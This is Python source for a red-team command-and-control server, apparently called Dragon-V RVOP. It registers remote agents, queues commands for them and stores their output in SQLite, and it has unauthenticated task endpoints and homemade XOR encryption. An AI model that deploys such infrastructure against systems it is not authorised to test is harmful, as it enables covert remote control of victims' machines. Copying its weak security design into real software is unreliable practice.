#!/usr/bin/env python3
"""
Dragon-V RVOP C2 Server
专业红队作战平台 - C2指挥中心
用于授权的红队测试环境
"""

import asyncio
import json
import logging
import time
import uuid
import hashlib
import base64
from datetime import datetime, timedelta
from typing import Dict, List, Optional, Any
from dataclasses import dataclass, asdict
from enum import Enum
import aiohttp
import websockets
from aiohttp import web
import sqlite3
import secrets
import ssl
import os

# 配置日志
logging.basicConfig(
    level=logging.INFO,
    format='[%(asctime)s] [%(levelname)s] %(message)s',
    handlers=[
        logging.FileHandler('c2_server.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

class AgentStatus(Enum):
    ONLINE = "online"
    OFFLINE = "offline"
    SLEEPING = "sleeping"
    ERROR = "error"
    COMPROMISED = "compromised"

class TaskStatus(Enum):
    PENDING = "pending"
    RUNNING = "running"
    COMPLETED = "completed"
    FAILED = "failed"
    TIMEOUT = "timeout"

@dataclass
class Agent:
    agent_id: str
    hostname: str
    platform: str
    ip_address: str
    last_seen: datetime
    first_seen: datetime
    status: AgentStatus
    capabilities: List[str]
    sleep_interval: int = 30
    encryption_key: str = ""

    def to_dict(self):
        data = asdict(self)
        data['status'] = self.status.value
        data['last_seen'] = self.last_seen.isoformat()
        data['first_seen'] = self.first_seen.isoformat()
        return data

@dataclass
class Task:
    task_id: str
    agent_id: str
    command: str
    parameters: Dict[str, Any]
    status: TaskStatus
    created_at: datetime
    started_at: Optional[datetime] = None
    completed_at: Optional[datetime] = None
    output: Optional[str] = None
    error: Optional[str] = None
    timeout: int = 300

class C2Server:
    def __init__(self, config_path: str = "c2_config.json"):
        self.config = self.load_config(config_path)
        self.agents: Dict[str, Agent] = {}
        self.tasks: Dict[str, Task] = {}
        self.completed_tasks: Dict[str, Task] = {}
        self.session = aiohttp.ClientSession()

        # 初始化数据库
        self.init_database()

        # 生成加密密钥
        self.generate_keys()

        # 启动心跳监控
        self.heartbeat_task = None

    def load_config(self, config_path: str) -> Dict:
        """加载配置文件"""
        default_config = {
            "host": "0.0.0.0",
            "port": 8080,
            "ssl_port": 8443,
            "ssl_cert": "certs/server.crt",
            "ssl_key": "certs/server.key",
            "database": "c2.db",
            "heartbeat_interval": 30,
            "agent_timeout": 120,
            "enable_ssl": True,
            "encryption_key": "default_rvop_key_change_me"
        }

        try:
            with open(config_path, 'r', encoding='utf-8') as f:
                config = json.load(f)
                default_config.update(config)
        except FileNotFoundError:
            logger.warning(f"配置文件 {config_path} 不存在，使用默认配置")

        return default_config

    def init_database(self):
        """初始化SQLite数据库"""
        os.makedirs("certs", exist_ok=True)
        os.makedirs("logs", exist_ok=True)

        conn = sqlite3.connect(self.config['database'])
        cursor = conn.cursor()

        # 创建表
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS agents (
                agent_id TEXT PRIMARY KEY,
                hostname TEXT,
                platform TEXT,
                ip_address TEXT,
                last_seen TEXT,
                first_seen TEXT,
                status TEXT,
                capabilities TEXT,
                sleep_interval INTEGER,
                encryption_key TEXT
            )
        ''')

        cursor.execute('''
            CREATE TABLE IF NOT EXISTS tasks (
                task_id TEXT PRIMARY KEY,
                agent_id TEXT,
                command TEXT,
                parameters TEXT,
                status TEXT,
                created_at TEXT,
                started_at TEXT,
                completed_at TEXT,
                output TEXT,
                error TEXT,
                timeout INTEGER,
                FOREIGN KEY (agent_id) REFERENCES agents (agent_id)
            )
        ''')

        cursor.execute('''
            CREATE TABLE IF NOT EXISTS operations (
                op_id TEXT PRIMARY KEY,
                name TEXT,
                description TEXT,
                start_time TEXT,
                end_time TEXT,
                status TEXT,
                target TEXT,
                agent_ids TEXT
            )
        ''')

        conn.commit()
        conn.close()
        logger.info("数据库初始化完成")

    def generate_keys(self):
        """生成加密密钥"""
        if 'encryption_key' not in self.config or self.config['encryption_key'] == 'default_rvop_key_change_me':
            self.config['encryption_key'] = secrets.token_urlsafe(32)
            logger.info("生成新的加密密钥")

    def encrypt_data(self, data: str) -> str:
        """简单的数据加密"""
        key = self.config['encryption_key'][:32].ljust(32, '0')
        cipher = []
        for i, char in enumerate(data):
            key_c = key[i % len(key)]
            cipher.append(chr(ord(char) ^ ord(key_c)))
        return base64.b64encode(''.join(cipher).encode()).decode()

    def decrypt_data(self, encrypted_data: str) -> str:
        """数据解密"""
        key = self.config['encryption_key'][:32].ljust(32, '0')
        decoded = base64.b64decode(encrypted_data.encode()).decode()
        decipher = []
        for i, char in enumerate(decoded):
            key_c = key[i % len(key)]
            decipher.append(chr(ord(char) ^ ord(key_c)))
        return ''.join(decipher)

    async def register_agent(self, request: web.Request) -> web.Response:
        """注册新代理"""
        try:
            data = await request.json()
            agent_id = data.get('agent_id')

            if not agent_id:
                return web.json_response({"error": "缺少agent_id"}, status=400)

            # 检查是否已存在
            if agent_id in self.agents:
                agent = self.agents[agent_id]
                agent.last_seen = datetime.now()
                agent.status = AgentStatus.ONLINE
            else:
                # 创建新代理
                agent = Agent(
                    agent_id=agent_id,
                    hostname=data.get('hostname', 'unknown'),
                    platform=data.get('platform', 'unknown'),
                    ip_address=request.remote,
                    last_seen=datetime.now(),
                    first_seen=datetime.now(),
                    status=AgentStatus.ONLINE,
                    capabilities=data.get('capabilities', []),
                    sleep_interval=data.get('sleep_interval', 30),
                    encryption_key=data.get('encryption_key', '')
                )
                self.agents[agent_id] = agent

                # 保存到数据库
                self.save_agent_to_db(agent)
                logger.info(f"新代理注册: {agent_id} ({agent.platform})")

            # 返回待执行任务
            pending_tasks = [task.task_id for task in self.tasks.values()
                           if task.status == TaskStatus.PENDING and task.agent_id == agent_id]

            response = {
                "status": "success",
                "agent_id": agent_id,
                "pending_tasks": pending_tasks,
                "command_id": self.generate_command_id()
            }

            return web.json_response(response)

        except Exception as e:
            logger.error(f"代理注册失败: {e}")
            return web.json_response({"error": str(e)}, status=500)

    async def agent_heartbeat(self, request: web.Request) -> web.Response:
        """代理心跳"""
        try:
            data = await request.json()
            agent_id = data.get('agent_id')

            if agent_id not in self.agents:
                return web.json_response({"error": "代理不存在"}, status=404)

            agent = self.agents[agent_id]
            agent.last_seen = datetime.now()
            agent.status = AgentStatus.ONLINE

            # 返回待执行任务
            pending_tasks = [task.task_id for task in self.tasks.values()
                           if task.status == TaskStatus.PENDING and task.agent_id == agent_id]

            response = {
                "status": "success",
                "pending_tasks": pending_tasks,
                "command_id": self.generate_command_id()
            }

            return web.json_response(response)

        except Exception as e:
            logger.error(f"心跳处理失败: {e}")
            return web.json_response({"error": str(e)}, status=500)

    async def submit_task_result(self, request: web.Request) -> web.Response:
        """提交任务结果"""
        try:
            data = await request.json()
            task_id = data.get('task_id')
            output = data.get('output', '')
            error = data.get('error', '')
            agent_id = data.get('agent_id')

            if task_id not in self.tasks:
                return web.json_response({"error": "任务不存在"}, status=404)

            task = self.tasks[task_id]
            task.output = output
            task.error = error
            task.completed_at = datetime.now()

            if error:
                task.status = TaskStatus.FAILED
            else:
                task.status = TaskStatus.COMPLETED

            # 保存到数据库
            self.save_task_to_db(task)

            # 移动到已完成任务
            self.completed_tasks[task_id] = task
            del self.tasks[task_id]

            logger.info(f"任务 {task_id} 完成，状态: {task.status.value}")

            return web.json_response({"status": "success"})

        except Exception as e:
            logger.error(f"任务结果提交失败: {e}")
            return web.json_response({"error": str(e)}, status=500)

    async def create_task(self, request: web.Request) -> web.Response:
        """创建新任务"""
        try:
            data = await request.json()
            agent_id = data.get('agent_id')
            command = data.get('command')
            parameters = data.get('parameters', {})

            if not agent_id or not command:
                return web.json_response({"error": "缺少必要参数"}, status=400)

            if agent_id not in self.agents:
                return web.json_response({"error": "代理不存在"}, status=404)

            task_id = str(uuid.uuid4())
            task = Task(
                task_id=task_id,
                agent_id=agent_id,
                command=command,
                parameters=parameters,
                status=TaskStatus.PENDING,
                created_at=datetime.now(),
                timeout=parameters.get('timeout', 300)
            )

            self.tasks[task_id] = task

            # 保存到数据库
            self.save_task_to_db(task)

            logger.info(f"创建任务 {task_id}: {command} -> {agent_id}")

            return web.json_response({
                "status": "success",
                "task_id": task_id,
                "message": "任务已创建"
            })

        except Exception as e:
            logger.error(f"任务创建失败: {e}")
            return web.json_response({"error": str(e)}, status=500)

    async def get_agents(self, request: web.Request) -> web.Response:
        """获取所有代理列表"""
        try:
            agents_list = list(self.agents.values())

            # 过滤超时的代理
            current_time = datetime.now()
            for agent_id, agent in list(self.agents.items()):
                if (current_time - agent.last_seen).seconds > self.config['agent_timeout']:
                    agent.status = AgentStatus.OFFLINE
                    logger.warning(f"代理 {agent_id} 超时离线")

            return web.json_response({
                "status": "success",
                "agents": [agent.to_dict() for agent in agents_list],
                "total_count": len(agents_list)
            })

        except Exception as e:
            logger.error(f"获取代理列表失败: {e}")
            return web.json_response({"error": str(e)}, status=500)

    async def get_tasks(self, request: web.Request) -> web.Response:
        """获取任务列表"""
        try:
            agent_id = request.query.get('agent_id')
            status_filter = request.query.get('status')

            tasks_list = list(self.tasks.values()) + list(self.completed_tasks.values())

            if agent_id:
                tasks_list = [t for t in tasks_list if t.agent_id == agent_id]

            if status_filter:
                tasks_list = [t for t in tasks_list if t.status.value == status_filter]

            return web.json_response({
                "status": "success",
                "tasks": [
                    {
                        "task_id": t.task_id,
                        "agent_id": t.agent_id,
                        "command": t.command,
                        "parameters": t.parameters,
                        "status": t.status.value,
                        "created_at": t.created_at.isoformat(),
                        "started_at": t.started_at.isoformat() if t.started_at else None,
                        "completed_at": t.completed_at.isoformat() if t.completed_at else None,
                        "output": t.output,
                        "error": t.error
                    }
                    for t in tasks_list
                ],
                "total_count": len(tasks_list)
            })

        except Exception as e:
            logger.error(f"获取任务列表失败: {e}")
            return web.json_response({"error": str(e)}, status=500)

    def generate_command_id(self) -> str:
        """生成唯一命令ID"""
        return secrets.token_urlsafe(16)

    def save_agent_to_db(self, agent: Agent):
        """保存代理到数据库"""
        conn = sqlite3.connect(self.config['database'])
        cursor = conn.cursor()

        cursor.execute('''
            INSERT OR REPLACE INTO agents
            (agent_id, hostname, platform, ip_address, last_seen, first_seen, status, capabilities, sleep_interval, encryption_key)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        ''', (
            agent.agent_id, agent.hostname, agent.platform, agent.ip_address,
            agent.last_seen.isoformat(), agent.first_seen.isoformat(), agent.status.value,
            json.dumps(agent.capabilities), agent.sleep_interval, agent.encryption_key
        ))

        conn.commit()
        conn.close()

    def save_task_to_db(self, task: Task):
        """保存任务到数据库"""
        conn = sqlite3.connect(self.config['database'])
        cursor = conn.cursor()

        cursor.execute('''
            INSERT OR REPLACE INTO tasks
            (task_id, agent_id, command, parameters, status, created_at, started_at, completed_at, output, error, timeout)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        ''', (
            task.task_id, task.agent_id, task.command, json.dumps(task.parameters),
            task.status.value, task.created_at.isoformat(),
            task.started_at.isoformat() if task.started_at else None,
            task.completed_at.isoformat() if task.completed_at else None,
            task.output, task.error, task.timeout
        ))

        conn.commit()
        conn.close()

    async def start_heartbeat_monitor(self):
        """启动心跳监控"""
        while True:
            try:
                current_time = datetime.now()
                timeout_seconds = self.config['agent_timeout']

                # 检查超时的代理
                for agent_id, agent in list(self.agents.items()):
                    if (current_time - agent.last_seen).seconds > timeout_seconds:
                        if agent.status == AgentStatus.ONLINE:
                            agent.status = AgentStatus.OFFLINE
                            logger.warning(f"代理 {agent_id} 超时离线")
                            self.save_agent_to_db(agent)

                await asyncio.sleep(self.config['heartbeat_interval'])

            except Exception as e:
                logger.error(f"心跳监控失败: {e}")
                await asyncio.sleep(10)

    async def start_web_server(self):
        """启动Web服务器"""
        app = web.Application()

        # 注册路由
        app.router.add_post('/api/register', self.register_agent)
        app.router.add_post('/api/heartbeat', self.agent_heartbeat)
        app.router.add_post('/api/task/result', self.submit_task_result)
        app.router.add_post('/api/task/create', self.create_task)
        app.router.add_get('/api/agents', self.get_agents)
        app.router.add_get('/api/tasks', self.get_tasks)

        # 静态文件服务
        app.router.add_static('/', path='static', name='static')

        # 启动HTTP服务器
        runner = web.AppRunner(app)
        await runner.setup()

        site = web.TCPSite(runner, self.config['host'], self.config['port'])
        await site.start()
        logger.info(f"C2 HTTP服务器启动在 http://{self.config['host']}:{self.config['port']}")

        # 如果启用SSL，启动HTTPS服务器
        if self.config.get('enable_ssl', False):
            ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
            try:
                ssl_context.load_cert_chain(self.config['ssl_cert'], self.config['ssl_key'])
            except Exception as e:
                logger.warning(f"SSL证书加载失败，使用HTTP: {e}")
            else:
                ssl_site = web.TCPSite(runner, self.config['host'], self.config['ssl_port'], ssl_context=ssl_context)
                await ssl_site.start()
                logger.info(f"C2 HTTPS服务器启动在 https://{self.config['host']}:{self.config['ssl_port']}")

        return runner

    async def start(self):
        """启动C2服务器"""
        logger.info("=== Dragon-V RVOP C2 Server ===")
        logger.info("启动红队作战指挥中心...")

        # 启动心跳监控
        self.heartbeat_task = asyncio.create_task(self.start_heartbeat_monitor())

        # 启动Web服务器
        runner = await self.start_web_server()

        logger.info("C2服务器启动完成")
        logger.info("等待代理连接...")

        try:
            await asyncio.Future()  # 永远运行
        except KeyboardInterrupt:
            logger.info("正在关闭C2服务器...")
            await runner.cleanup()
            if self.heartbeat_task:
                self.heartbeat_task.cancel()
            await self.session.close()

def main():
    """主函数"""
    server = C2Server()
    asyncio.run(server.start())

if __name__ == "__main__":
    main()